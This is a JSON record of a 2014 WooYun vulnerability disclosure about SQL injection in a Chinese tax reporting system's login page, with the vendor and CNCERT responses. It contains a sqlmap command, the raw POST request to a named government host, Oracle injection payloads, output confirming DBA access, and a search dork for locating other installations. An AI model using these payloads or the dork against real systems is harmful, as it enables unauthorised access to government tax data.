{"id": 854, "wybug_id": "wooyun-2014-068010", "wybug_title": "某通用税务软件SQL注入漏洞", "wybug_corp": "北京亿信华辰软件有限责任公司", "wybug_author": "loli", "wybug_date": "2014-07-10 15:50", "wybug_open_date": "2014-10-08 15:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "登陆框注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-08：\t细节向公众公开  简要描述： GOV开发商们该交学费了 详细说明：       统计报表及重点税源管理软件是应用于国家税务总局税收计划、会计统计核算、重点税源管理、大企业税收管理等业务领域的报表管理、数据统计分析平台。整个软件平台由税收计会统报表系统（TRS）、重点税源管理系统（TRAS）、大企业税收管理系统（VICDP）、税收数据分析系统（WTAP）组成。-------------------------------------------------------------------------登陆框注入，随便丢了个单引号就爆语句了。。。\nhttp://www.snds.gov.cn:99/i/oem/grpslogin.jsp\n\n\n\n\n\n<code>直接丢SQLMap里跑就行了，漏洞参数id：./sqlmap.py -r test.txt -p id --is-dba<code>POST /i/oem/grpslogin.jsp HTTP/1.1Host: www.snds.gov.cn:99Proxy-Connection: keep-aliveContent-Length: 45Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.snds.gov.cn:99User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www.snds.gov.cn:99/i/oem/grpslogin.jspAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: JSESSIONID=2v2nT97LN6ylvDRB2bQTYXSJld6J5Tm2vvT6182H3Z1mG17N6cvF!-141727717taskGroup=ZDSY&id=aaaa&opid=1&noleft=0&pw=aaa\n\nPlace: POSTParameter: id    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: taskGroup=ZDSY&id=aaaa' AND 8581=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(113)||CHR(117)||CHR(113)||(SELECT (CASE WHEN (8581=8581) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(104)||CHR(102)||CHR(98)||CHR(113)||CHR(62))) FROM DUAL) AND 'GMad'='GMad&opid=1&noleft=0&pw=aaa    Type: AND/OR time-based blind    Title: Oracle OR time-based blind    Payload: taskGroup=ZDSY&id=-9365' OR 5766=DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(78)||CHR(109)||CHR(85),5) AND 'VquD'='VquD&opid=1&noleft=0&pw=aaa---[11:33:18] [INFO] the back-end DBMS is Oracleback-end DBMS: Oracle[11:33:18] [INFO] testing if current user is DBA[11:33:22] [WARNING] reflective value(s) found and filtering outcurrent user is DBA:    True\n   漏洞证明：  GOV的就不去猜表了。\n---[11:42:58] [INFO] the back-end DBMS is Oracleback-end DBMS: Oracle[11:42:58] [INFO] fetching current database[11:42:58] [INFO] resumed: IRPT[11:42:58] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'IRPT'\ngoogle随便找点吧。（貌似全国都是用的这一家）：inurl:/grpslogin.jsp   修复方案：  过滤。   版权声明：转载请注明来源 loli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-07-15 09:59 厂商回复： CNVD确认若干实例，同时确认为垂直行业专用定制系统，根据测试实例，转由CNCERT向对应的多个分中心下发处置案例，同时由CNCERT向国家上级信息安全协调机构通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}